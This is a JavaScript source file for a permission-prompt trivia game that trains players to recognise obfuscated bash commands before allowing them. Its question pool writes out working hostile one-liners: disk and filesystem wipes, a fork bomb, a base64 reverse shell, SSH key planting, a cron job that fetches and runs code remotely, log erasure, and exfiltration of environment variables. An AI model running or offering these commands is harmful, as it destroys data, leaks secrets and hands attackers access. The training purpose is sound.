// A permission-prompt trivia game. Every round is a real bash one-liner,
// deliberately uglified — hex-encoded, base64-piped, IFS-spaced — the way an
// obfuscated command actually looks when something is trying not to be read.
// You get one job: allow it, or deny it.

import { confetti } from '../toys/confetti.js';

const ROUNDS = 8;

// harmful: true means the only correct answer is deny. explain is read after
// every answer, right or wrong — the point is decoding the command, not the score.
const POOL = [
  {
    cmd: `eval "$(printf '\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x2d\\x2d\\x6e\\x6f\\x2d\\x70\\x72\\x65\\x73\\x65\\x72\\x76\\x65\\x2d\\x72\\x6f\\x6f\\x74\\x20\\x2f')"`,
    harmful: true,
    explain: 'hex-decodes to `rm -rf --no-preserve-root /` — deletes every file on the filesystem, starting at root.'
  },
  {
    cmd: 'bash <(curl -fsSL https://bit.ly/3xK9zQ2)',
    harmful: true,
    explain: "runs a script straight off a shortened link — you're executing whatever is behind that redirect, sight unseen."
  },
  {
    cmd: ':(){ :|:& };:',
    harmful: true,
    explain: 'a fork bomb — it spawns copies of itself forever until the machine runs out of processes and locks up.'
  },
  {
    cmd: 'k=$(curl -s http://45.33.12.9/id_rsa.pub); echo "$k" >> ~/.ssh/authorized_keys',
    harmful: true,
    explain: "fetches a public key from a bare IP and appends it to authorized_keys — gives someone else permanent SSH access to this machine."
  },
  {
    cmd: "dd if=/dev/zero of=$(mount | awk 'NR==1{print $1}') bs=1M",
    harmful: true,
    explain: 'resolves your boot disk, then overwrites it with zeros — an obfuscated way of saying "erase the entire drive".'
  },
  {
    cmd: 'bash -c "$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNTAvNDQ0NCAwPiYx | base64 -d)"',
    harmful: true,
    explain: 'base64-decodes to a reverse shell — it phones home to an attacker and hands them a live terminal on this machine.'
  },
  {
    cmd: 'unset HISTFILE; history -c; find /var/log -type f -exec sh -c \'> "$1"\' _ {} \\;',
    harmful: true,
    explain: 'disables and wipes your shell history, then empties every log file — the standard move for covering tracks.'
  },
  {
    cmd: '(crontab -l 2>/dev/null; echo "* * * * * curl -s http://185.220.101.4/x|sh") | crontab -',
    harmful: true,
    explain: 'quietly installs a cron job that re-downloads and runs a remote script every single minute, forever.'
  },
  {
    cmd: "dpkg -l | awk '/^ii/{print $2}' | xargs -r apt-get -y purge",
    harmful: true,
    explain: 'uninstalls every package currently on the system, one by one.'
  },
  {
    cmd: 'env | base64 | curl -s -X POST --data-binary @- https://telemetry-collect.io/log',
    harmful: true,
    explain: 'base64-encodes every environment variable — which is exactly where API keys and tokens live — and mails it off to a stranger.'
  },
  {
    cmd: 'cat /etc/os-release',
    harmful: false,
    explain: 'prints basic OS info to the screen. read-only, changes nothing.'
  },
  {
    cmd: 'd=$(pwd); cd "$d" && du -sh .[!.]* * 2>/dev/null | sort -rh | head -20',
    harmful: false,
    explain: 'lists the 20 biggest files and folders in the current directory, largest first. nothing is written.'
  },
  {
    cmd: 'curl -s https://api.github.com/repos/rails/rails/releases/latest | grep tag_name',
    harmful: false,
    explain: 'hits a public, read-only GitHub API endpoint to print the latest Rails version. no auth, no writes.'
  },
  {
    cmd: 'rsync -av --dry-run ~/project/ backup-host:/srv/project/',
    harmful: false,
    explain: '`--dry-run` means rsync only prints what it *would* copy — nothing is actually transferred.'
  },
  {
    cmd: 'p=$(git rev-parse --show-toplevel 2>/dev/null || pwd); rm -rf "$p/node_modules"',
    harmful: false,
    explain: "resolves the current git project's root and deletes only its node_modules — a routine npm install reset."
  },
  {
    cmd: 'openssl rand -hex 32',
    harmful: false,
    explain: 'prints 32 random bytes as hex, a common way to generate a secret key. touches nothing on disk.'
  },
  {
    cmd: 'lsof -iTCP:3000 -sTCP:LISTEN',
    harmful: false,
    explain: 'lists whatever process is currently listening on port 3000. purely informational.'
  },
  {
    cmd: 'git log --oneline --since="2 weeks ago" | wc -l',
    harmful: false,
    explain: 'counts how many commits landed in the last two weeks. read-only.'
  },
  {
    cmd: "ps aux | awk '$3+0 > 50'",
    harmful: false,
    explain: 'lists processes using more than 50% CPU. informational only.'
  }
];

function shuffled(list) {
  const copy = list.slice();
  for (let i = copy.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [copy[i], copy[j]] = [copy[j], copy[i]];
  }
  return copy;
}

function verdictFor(score, total) {
  if (score === total) return "flawless. you'd catch the one your reviewer misses.";
  if (score >= total * 0.75) return 'good instincts — a little paranoid is exactly right.';
  if (score >= total * 0.5) return 'about average. read the whole line before you type y.';
  return "you'd have `rm -rf`'d something by now. let it explain itself first.";
}

const renderRound = (item, roundNum, total) => [
  { text: '' },
  { text: `Bash command [${roundNum}/${total}]`, kind: 'dim' },
  { text: `  ${item.cmd}` },
  { text: '' },
  { text: 'allow this command to run? (y/n)', kind: 'dim' }
];

export function claude({ enterMode }) {
  const rounds = shuffled(POOL).slice(0, ROUNDS);
  let index = 0;
  let score = 0;

  const mode = {
    label: `claude(1/${rounds.length})`,
    onSubmit(raw) {
      const input = raw.trim().toLowerCase();
      if (input === 'exit' || input === 'quit') return { lines: [], exit: true };

      const allow = ['y', 'yes', 'allow'].includes(input);
      const deny = ['n', 'no', 'deny', 'block'].includes(input);
      if (!allow && !deny) {
        return [{ text: 'ArgumentError: type y or n (allow / deny also work)', kind: 'accent' }];
      }

      const item = rounds[index];
      const correctChoice = item.harmful ? 'deny' : 'allow';
      const correct = (allow ? 'allow' : 'deny') === correctChoice;
      if (correct) score += 1;

      const out = [
        {
          text: correct ? '=> :correct' : `=> :wrong, should have been :${correctChoice}ed`,
          kind: 'accent'
        },
        { text: `  ${item.explain}`, kind: 'dim' }
      ];

      index += 1;

      if (index >= rounds.length) {
        out.push({ text: '' });
        out.push({ text: `final score: ${score}/${rounds.length}`, kind: 'accent' });
        out.push({ text: verdictFor(score, rounds.length), kind: 'dim' });
        if (score === rounds.length) confetti();
        return { lines: out, exit: true };
      }

      mode.label = `claude(${index + 1}/${rounds.length})`;
      out.push(...renderRound(rounds[index], index + 1, rounds.length));
      return out;
    },
    onExit() {
      if (index >= rounds.length) return [{ text: '' }];
      if (index === 0) return [{ text: '=> :abandoned' }, { text: '' }];
      return [
        { text: `stopped at ${index}/${rounds.length} — score: ${score}/${index}`, kind: 'dim' },
        { text: '=> :abandoned' },
        { text: '' }
      ];
    }
  };

  enterMode(mode);

  return [
    { text: `=> #<Claude rounds: ${rounds.length}, tool: :bash>` },
    { text: '   every prompt below is a real permission request. read it closely —', kind: 'dim' },
    { text: '   some of these are uglified on purpose. y to allow, n to deny.', kind: 'dim' },
    { text: '   type exit to give up.', kind: 'dim' },
    ...renderRound(rounds[0], 1, rounds.length)
  ];
}
